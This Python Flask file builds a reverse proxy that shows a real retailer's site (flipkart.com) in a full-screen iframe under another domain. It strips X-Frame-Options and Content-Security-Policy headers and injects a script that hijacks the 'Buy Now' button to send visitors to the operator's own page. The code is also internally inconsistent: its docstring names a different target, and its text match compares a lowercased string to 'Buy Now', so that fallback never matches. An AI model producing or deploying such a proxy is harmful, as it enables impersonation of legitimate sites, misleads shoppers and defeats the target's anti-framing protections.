"""
Reverse proxy for dragontournament.xyz
- "/"           -> your landing page with the iframe
- "/site/<path>"-> proxied copy of dragontournament.xyz (script-injected)
- "/game.html"  -> your own game, served full-page (NOT in an iframe)
"""

from flask import Flask, request, Response, send_from_directory
from urllib.parse import urljoin
import requests

app = Flask(__name__, static_folder="static")

TARGET = "https://flipkart.com"

# Headers that must never be copied straight through from the upstream response
EXCLUDED_RESPONSE_HEADERS = {
    "content-encoding", "content-length", "transfer-encoding", "connection",
    "x-frame-options", "content-security-policy", "content-security-policy-report-only",
}

# Script injected into every proxied HTML page.
# It looks for the "Buy Now" button using a few common selector patterns.
# >>> Edit the selector list below to match the REAL button on your page. <<<
INJECT_SCRIPT = """
<script>
(function () {
  function wireStartButton() {
    var selectors = [
      '#startGameBtn',
      '#start-game',
      '.start-game-btn',
      '[data-action="start-game"]',
      'button:contains("Buy Now")'  // not valid CSS, kept only as a reminder to check manually
    ];
    var btn = null;
    for (var i = 0; i < selectors.length; i++) {
      try {
        var el = document.querySelector(selectors[i]);
        if (el) { btn = el; break; }
      } catch (e) { /* ignore invalid selector like :contains */ }
    }
    // Fallback: search all buttons/links by visible text
    if (!btn) {
      var candidates = document.querySelectorAll('button, a, div, span');
      for (var j = 0; j < candidates.length; j++) {
        if (candidates[j].textContent.trim().toLowerCase() === 'Buy Now') {
          btn = candidates[j];
          break;
        }
      }
    }
    if (btn) {
      btn.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        // Break out of the iframe entirely, load the game full page
        window.top.location.href = '/game.html';
      });
    }
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', wireStartButton);
  } else {
    wireStartButton();
  }
})();
</script>
"""


def rewrite_html(html: str, base_url: str) -> str:
    """Inject our script and make sure a <base> tag exists so relative
    assets (css/js/img) still resolve against the real site."""
    if "<base " not in html and "<head>" in html:
        html = html.replace("<head>", f'<head><base href="{base_url}/">', 1)
    if "</body>" in html:
        html = html.replace("</body>", INJECT_SCRIPT + "</body>")
    else:
        html += INJECT_SCRIPT
    return html


@app.route("/")
def index():
    return """
<!DOCTYPE html>
<html>
<head>
  <title>Dragon Tournament</title>
  <style>
    html, body { margin:0; padding:0; height:100%; overflow:hidden; }
    iframe { border:none; width:100vw; height:100vh; display:block; }
  </style>
</head>
<body>
  <iframe src="/site/" allow="fullscreen"></iframe>
</body>
</html>
"""


@app.route("/site/", defaults={"path": ""})
@app.route("/site/<path:path>")
def proxy(path):
    upstream_url = urljoin(TARGET + "/", path)

    upstream_resp = requests.get(
        upstream_url,
        params=request.args,
        headers={"User-Agent": request.headers.get("User-Agent", "Mozilla/5.0")},
        timeout=15,
    )

    content_type = upstream_resp.headers.get("Content-Type", "")

    if "text/html" in content_type:
        body = rewrite_html(upstream_resp.text, TARGET)
        resp = Response(body, upstream_resp.status_code)
    else:
        # css/js/images/fonts etc. pass through unchanged
        resp = Response(upstream_resp.content, upstream_resp.status_code)

    for key, value in upstream_resp.headers.items():
        if key.lower() not in EXCLUDED_RESPONSE_HEADERS:
            resp.headers[key] = value
    if content_type:
        resp.headers["Content-Type"] = content_type

    return resp


@app.route("/game.html")
def game():
    # Served full-page, outside any iframe
    return send_from_directory(app.static_folder, "game.html")


if __name__ == "__main__":
    app.run(debug=True, port=5000)
